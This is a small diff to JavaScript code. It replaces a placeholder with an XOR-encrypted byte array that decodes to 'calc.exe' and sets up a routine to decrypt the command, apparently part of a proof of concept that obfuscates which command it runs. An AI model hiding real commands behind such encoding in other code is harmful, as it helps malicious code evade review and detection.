@@ -16,8 +16,8 @@
 			var keyPart2 = 0x30;
 			var xorKey = keyPart1 + keyPart2;
 			
-			// Encrypted command using the XOR cipher (this needs to be pre-calculated based on the chosen key)
-			var encryptedCmd = [/* Encrypted "calc.exe" char codes */];
+			// Encrypted command using the XOR cipher
+			var encryptedCmd = [54, 52, 57, 54, 123, 48, 45, 48];
 			
 			// Decrypt the command
 			var cmd = "";
